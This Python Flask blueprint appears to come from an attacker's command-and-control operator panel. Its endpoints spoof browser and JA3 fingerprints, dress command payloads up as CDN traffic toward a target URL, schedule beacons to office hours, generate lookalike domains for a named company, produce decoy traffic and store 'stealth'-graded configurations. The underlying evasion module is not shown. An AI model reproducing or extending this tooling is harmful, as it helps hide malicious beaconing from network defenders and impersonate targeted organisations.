"""evasion blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db

bp = Blueprint("evasion", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/evasion/profiles', methods=['GET'])
def api_evasion_profiles():
    from evasion_framework import get_traffic_profiles, get_timing_profiles, get_domain_categories, get_ja3_profiles, get_decoy_patterns
    return jsonify({
        'traffic_profiles': get_traffic_profiles(),
        'timing_profiles': get_timing_profiles(),
        'domain_categories': get_domain_categories(),
        'ja3_profiles': get_ja3_profiles(),
        'decoy_patterns': get_decoy_patterns(),
    })

@bp.route('/api/evasion/fingerprint', methods=['POST'])
def api_evasion_fingerprint():
    from evasion_framework import generate_spoofed_fingerprint
    data = request.get_json(force=True)
    device_class = data.get('device_class', 'desktop')
    consistency = data.get('consistency', True)
    result = generate_spoofed_fingerprint(device_class, consistency)
    track_event('evasion')
    return jsonify(result)

@bp.route('/api/evasion/disguise', methods=['POST'])
def api_evasion_disguise():
    from evasion_framework import generate_disguised_request
    data = request.get_json(force=True)
    profile_key = data.get('profile', 'cdn_static')
    payload = data.get('payload', {'cmd': 'heartbeat'})
    target_url = data.get('target_url')
    result = generate_disguised_request(profile_key, payload, target_url)
    track_event('evasion')
    return jsonify(result)

@bp.route('/api/evasion/beacon-schedule', methods=['POST'])
def api_evasion_beacon():
    from evasion_framework import generate_beacon_schedule
    data = request.get_json(force=True)
    profile = data.get('profile', 'office_hours')
    duration = data.get('duration_hours', 24)
    result = generate_beacon_schedule(profile, duration)
    return jsonify(result)

@bp.route('/api/evasion/domains', methods=['POST'])
def api_evasion_domains():
    from evasion_framework import generate_domains
    data = request.get_json(force=True)
    category = data.get('category', 'business')
    company = data.get('company', 'AcmeCorp')
    count = data.get('count', 5)
    result = generate_domains(category, company, count)
    return jsonify(result)

@bp.route('/api/evasion/decoy', methods=['POST'])
def api_evasion_decoy():
    from evasion_framework import generate_decoy_traffic
    data = request.get_json(force=True)
    pattern = data.get('pattern', 'browsing')
    duration = data.get('duration_minutes', 30)
    result = generate_decoy_traffic(pattern, duration)
    return jsonify(result)

@bp.route('/api/evasion/config', methods=['POST'])
def api_evasion_config():
    from evasion_framework import build_evasion_config
    data = request.get_json(force=True)
    options = data.get('options', {})
    config = build_evasion_config(options)
    track_event('evasion')
    # Save to database
    name = data.get('name', f'Config {datetime.now().strftime("%Y%m%d_%H%M%S")}')
    db.save_evasion_config(
        name=name, config=config,
        stealth_score=config.get('overall_stealth_score', 0),
        stealth_grade=config.get('stealth_grade', 'C'),
        traffic_profile=options.get('traffic_profile', ''),
        timing_profile=options.get('timing_profile', ''),
        created_by=session.get('IAm-logined', 'unknown'))
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'evasion_config',
                           f'Built evasion config: {name}', request.remote_addr)
    return jsonify(config)

@bp.route('/api/evasion/saved', methods=['GET'])
def api_evasion_saved():
    configs = db.get_evasion_configs()
    return jsonify({'configs': configs})

@bp.route('/api/evasion/saved/<int:config_id>', methods=['DELETE'])
def api_evasion_delete(config_id):
    db.delete_evasion_config(config_id)
    return jsonify({'status': 'deleted'})


# ═══════════════════════════════════════════════════════════════
# THREAT INTELLIGENCE API
# ═══════════════════════════════════════════════════════════════
